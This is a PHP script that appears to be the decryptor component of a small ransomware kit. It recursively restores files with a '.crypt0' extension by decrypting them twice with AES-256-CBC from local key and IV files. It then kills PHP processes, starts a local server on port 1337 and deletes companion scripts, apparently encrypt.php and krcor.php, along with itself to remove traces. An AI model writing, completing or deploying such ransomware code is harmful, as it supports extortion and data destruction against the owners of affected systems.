<?php
ini_set('memory_limit', '-1');
set_time_limit(0);
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {//Credits to some website which isn't up right now
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    }
    else if( $action == 'decrypt' ){
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

function decfile($filename){
	if (strpos($filename, '.crypt0') === FALSE) {
	return;
	}
	$encrypted2 = file_get_contents($filename);

	$encrypted = encrypt_decrypt('decrypt', $encrypted2, file_get_contents(".key2.pem"), file_get_contents(".iv.pem"));

	$decrypted = encrypt_decrypt('decrypt', $encrypted, file_get_contents(".key1.pem"), file_get_contents(".iv.pem"));

	file_put_contents(substr($filename, 0, -7), $decrypted);
	unlink($filename);
}

function decdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				decdir($dir."/".$file);
			}else {
				decfile($dir."/".$file);
		}
	}
}

$key1 = file_get_contents(".key1.pem");
$key2 = file_get_contents(".key2.pem");
$iv = file_get_contents(".iv.pem");
shell_exec("pkill php & php -S localhost:1337");
	unlink($_SERVER['DOCUMENT_ROOT'] . "/encrypt.php");
unlink($_SERVER['DOCUMENT_ROOT'] . "/krcor.php");
	decdir($_SERVER['DOCUMENT_ROOT'] . "/Desktop");
unlink($_SERVER['DOCUMENT_ROOT'] . "/decrypt.php");

?>
